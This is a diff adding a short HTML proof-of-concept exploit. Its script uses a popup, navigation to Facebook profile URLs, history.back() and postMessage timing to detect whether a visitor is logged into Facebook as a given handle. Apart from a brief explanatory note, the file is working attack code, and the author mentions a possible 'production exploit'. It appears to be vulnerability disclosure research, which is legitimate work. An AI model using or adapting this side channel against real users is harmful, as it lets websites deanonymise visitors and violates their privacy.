@@ -1,0 +1,29 @@
+<html><body>
+This is only PoC. Type smth like oijfowijefohwqe and your real handle on Facebook e.g. egor.homakov and see how detector work. It's pretty slow (20 seconds to be sure) history object is changed only after full page loading. In production exploit I could invent something, but PoC is interesting on itself. And, yeah, you don't need to allow Popups in Chrome - because Popup in Chrome are opened in fact and work in background. Just wait...
+<script>
+window.onmessage=function(e){
+  if(await){
+    clearTimeout(fail);
+    alert("Yes, you are "+handle);
+  }else{
+    await = true;
+  }
+}
+handle = prompt('Lets check if you are...(e.g. egor.homakov):')
+
+await = false;
+//opener.postMessage("","*")
+x=window.open('data:text/html,<script>opener.postMessage("","*")<'+'/script>'); 
+setTimeout(function(){
+  x.location=('http://www.facebook.com/profile.php#')
+  setTimeout(function(){
+    x.location=('http://www.facebook.com/'+handle+'#')
+    setTimeout(function(){
+      fail = setTimeout(function(){
+        alert('No, its not you. Reload the page and try again')
+      }, 500);
+      x.history.back()
+    },10000)
+  },10000)
+},200)
+</script></body></html>
